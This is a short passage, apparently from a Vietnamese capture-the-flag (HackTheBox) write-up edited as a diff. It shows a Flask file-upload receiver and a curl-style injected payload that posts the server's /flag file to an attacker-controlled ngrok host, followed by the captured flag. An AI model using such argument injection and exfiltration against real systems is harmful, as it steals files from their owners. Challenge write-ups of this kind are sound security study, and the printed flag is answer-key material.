@@ -24,7 +24,8 @@ def upload_file():
       return 'file uploaded successfully'
 
 if __name__ == '__main__':
-   app.run(host="0.0.0.0",port=8888)``` 
+   app.run(host="0.0.0.0",port=8888)
+   ``` 
    
 sau đó nhập payload này:   __http://2360-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io/upload -X POST -F file=@/flag__
 như vậy ta sẽ nhận tệp flag gửi về __HTB{curl_pwn4g3_3n_r0ut3!}__
